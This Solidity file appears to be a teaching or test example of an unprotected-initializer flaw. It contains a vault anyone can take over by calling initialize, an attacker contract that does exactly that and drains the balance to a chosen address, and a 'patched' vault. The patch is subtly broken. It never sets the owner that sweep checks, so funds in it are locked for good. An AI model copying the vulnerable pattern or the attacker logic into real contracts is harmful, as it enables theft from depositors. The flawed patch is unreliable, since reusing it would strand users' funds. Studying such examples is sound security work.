// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableInitializableVault {
    address public owner;

    function initialize(address newOwner) external virtual {
        require(owner == address(0), "already initialized");
        owner = newOwner;
    }

    function deposit() external payable {}

    function sweep(address payable to) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

contract PatchedInitializableVault is VulnerableInitializableVault {
    address public immutable OWNER;

    constructor(address vaultOwner) {
        OWNER = vaultOwner;
    }

    function initialize(address) external pure override {
        revert("already initialized");
    }
}

contract AccessControlAttacker {
    function exploit(VulnerableInitializableVault target, address payable thief) external {
        target.initialize(address(this));
        target.sweep(thief);
    }
}
